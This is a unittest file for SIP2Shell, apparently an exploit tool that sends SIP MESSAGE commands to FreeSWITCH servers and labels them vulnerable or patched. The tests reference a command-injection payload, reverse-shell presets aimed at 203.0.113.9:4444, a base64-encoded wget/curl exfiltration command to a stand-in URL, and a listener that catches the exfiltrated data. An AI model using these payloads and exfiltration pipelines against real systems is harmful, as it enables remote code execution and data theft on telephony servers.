"""Unit + smoke tests for SIP2Shell (standard library unittest)."""

import importlib.util
import os
import socket
import unittest
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
spec = importlib.util.spec_from_file_location(
    "sip2shell", os.path.join(HERE, "..", "sip2shell.py"))
s2s = importlib.util.module_from_spec(spec)
spec.loader.exec_module(s2s)


class TestPayload(unittest.TestCase):
    def test_quote_user_encodes_plus_and_space(self):
        q = s2s._quote_user("system id; tr '+/' '-_'")
        self.assertIn("%20", q)
        self.assertIn("%2B", q)
        self.assertNotIn("+", q)

    def test_sip_message_shape(self):
        msg = s2s.sip_message("MESSAGE", "1.2.3.4", 5060, "api+version",
                              "5.6.7.8", 4000, udp=True, body=b"x",
                              ctype="text/plain").decode()
        self.assertTrue(msg.startswith("MESSAGE sip:api+version@1.2.3.4:5060 SIP/2.0"))
        self.assertIn("Via: SIP/2.0/UDP 5.6.7.8:4000", msg)
        self.assertIn("Content-Type: text/plain", msg)
        self.assertTrue(msg.endswith("x"))

    def test_parse_message(self):
        raw = b"SIP/2.0 403 Forbidden\r\nServer: FreeSWITCH-mod_sofia/1.11.3\r\n\r\n"
        m = s2s.parse_message(raw)
        self.assertEqual(m["status"], 403)
        self.assertIn("server", m["headers"])
        self.assertEqual(m["body"], b"")

    def test_classify(self):
        self.assertEqual(s2s.classify({"status": 202}), "vulnerable")
        self.assertEqual(s2s.classify({"status": 200}), "vulnerable")
        self.assertEqual(s2s.classify({"status": 403}), "patched")
        self.assertEqual(s2s.classify({"status": 407}), "auth-required")
        self.assertEqual(s2s.classify({"status": None}), "unreachable")

    def test_parse_proxy(self):
        px = s2s.parse_proxy("socks5://u:p@127.0.0.1:1080")
        self.assertEqual((px["host"], px["port"], px["user"], px["password"]),
                         ("127.0.0.1", 1080, "u", "p"))
        self.assertEqual(s2s.parse_proxy("1.2.3.4:1080")["port"], 1080)
        with self.assertRaises(s2s.Socks5Error):
            s2s.parse_proxy("1.2.3.4")

    def test_folded_header(self):
        raw = (b"SIP/2.0 200 OK\r\nServer: FreeSWITCH\r\n"
               b" mod_sofia/1.10.12\r\nContent-Length: 0\r\n\r\n")
        m = s2s.parse_message(raw)
        self.assertIn("mod_sofia/1.10.12", m["headers"]["server"][0])

    def test_revshell_presets_format(self):
        for _name, tpl in s2s.REVSHELLS:
            text = tpl.format(h="203.0.113.9", p="4444")
            self.assertIn("203.0.113.9", text)
            self.assertIn("4444", text)

    def test_udp_proxy_rejected(self):
        cli = s2s.SipClient(lhost="127.0.0.1", lport=0, udp=True,
                            proxy={"host": "127.0.0.1", "port": 1,
                                   "user": "", "password": ""})
        with self.assertRaises(s2s.SipError):
            cli.open()

    def test_exfil_command_has_pipeline_and_client(self):
        c = s2s.exfil_command("id", "http://h:1/tok")
        self.assertIn("base64 -w0", c)
        self.assertIn("http://h:1/tok/$(", c)
        self.assertIn("wget", c)
        self.assertIn("curl", c)


class TestOob(unittest.TestCase):
    def test_roundtrip(self):
        import base64
        oob = s2s.Oob(host="127.0.0.1", port=0).start()
        try:
            payload = base64.b64encode(b"hello world").decode().translate(
                str.maketrans("+/", "-_"))
            urllib.request.urlopen(f"{oob.url()}/{payload}", timeout=3).read()
            ev = oob.wait(3)
            self.assertIsNotNone(ev)
            self.assertEqual(ev[1], "hello world")
        finally:
            oob.close()


class TestLocalSip(unittest.TestCase):
    """A tiny fake front so we can exercise the client without Docker."""

    def test_exchange_gets_reply(self):
        srv = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        srv.bind(("127.0.0.1", 0))
        port = srv.getsockname()[1]

        def serve():
            data, addr = srv.recvfrom(65535)
            srv.sendto(b"SIP/2.0 202 Accepted\r\nContent-Length: 0\r\n\r\n", addr)
            # chat read-back
            data, addr = srv.recvfrom(65535)
            srv.sendto(b"MESSAGE sip:x@127.0.0.1 SIP/2.0\r\nCall-ID: r\r\n"
                       b"CSeq: 1 MESSAGE\r\n\r\nFreeSWITCH Version 1.10.12", addr)

        import threading
        threading.Thread(target=serve, daemon=True).start()
        cli = s2s.SipClient(lhost="127.0.0.1", lport=0, udp=True, timeout=3)
        cli.open()
        try:
            r = cli.exchange("MESSAGE", "127.0.0.1", port, "api+version",
                             body=b"x", ctype="text/plain", timeout=3)
            self.assertIsNotNone(r["reply"] or r["status"])
        finally:
            cli.close()
            srv.close()


if __name__ == "__main__":
    unittest.main()
